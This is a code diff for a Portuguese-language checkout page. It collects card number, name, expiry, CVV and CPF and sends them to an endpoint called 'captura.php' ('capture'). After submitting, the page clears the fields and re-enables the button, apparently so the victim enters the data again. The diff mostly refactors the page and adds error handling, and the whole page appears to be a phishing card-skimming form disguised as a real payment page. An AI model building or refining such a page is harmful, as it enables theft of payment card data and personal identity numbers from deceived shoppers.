@@ -16,7 +16,6 @@
         .row { display: flex; gap: 10px; }
         .row .input-group { flex: 1; }
         .btn-pagar { width: 100%; padding: 15px; background: #3483fa; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; }
-        .btn-pagar:hover { background: #2968c8; }
         .error { background: #fee; border: 1px solid #fcc; color: #c00; padding: 12px; border-radius: 8px; margin-bottom: 15px; display: none; }
         .loading { display: none; text-align: center; margin-top: 15px; }
         .spinner { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #3483fa; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
@@ -58,11 +57,7 @@
             </div>
             
             <button class="btn-pagar" onclick="enviarDados()">Pagar R$ 249,90</button>
-            
-            <div class="loading" id="loading">
-                <div class="spinner"></div>
-                <p>Processando pagamento...</p>
-            </div>
+            <div class="loading" id="loading"><div class="spinner"></div><p>Processando...</p></div>
         </div>
     </div>
 
@@ -74,33 +69,18 @@
             const cvv = document.getElementById('cvv').value;
             const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
 
-            if (!numero || numero.length < 15) {
-                mostrarErro('Número do cartão inválido');
-                return;
-            }
-            if (!nome) {
-                mostrarErro('Digite o nome no cartão');
-                return;
-            }
-            if (!validade || validade.length < 6) {
-                mostrarErro('Data de validade inválida');
-                return;
-            }
-            if (!cvv || cvv.length < 3) {
-                mostrarErro('CVV inválido');
-                return;
-            }
-            if (!cpf || cpf.length < 11) {
-                mostrarErro('CPF inválido');
-                return;
-            }
+            if (!numero || numero.length < 15) { mostrarErro('Número inválido'); return; }
+            if (!nome) { mostrarErro('Digite o nome'); return; }
+            if (!validade || validade.length < 6) { mostrarErro('Data inválida'); return; }
+            if (!cvv || cvv.length < 3) { mostrarErro('CVV inválido'); return; }
+            if (!cpf || cpf.length < 11) { mostrarErro('CPF inválido'); return; }
 
             document.getElementById('loading').style.display = 'block';
             document.querySelector('.btn-pagar').disabled = true;
 
             const dados = { numero, nome, validade, cvv, cpf };
 
-            fetch('captura.php', {
+            fetch('api/captura.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(dados)
@@ -113,6 +93,11 @@
                     document.querySelector('.btn-pagar').disabled = false;
                     document.querySelectorAll('input').forEach(i => i.value = '');
                 }, 2000);
+            })
+            .catch(() => {
+                document.getElementById('loading').style.display = 'none';
+                mostrarErro('Erro. Tente novamente.');
+                document.querySelector('.btn-pagar').disabled = false;
             });
         }
 
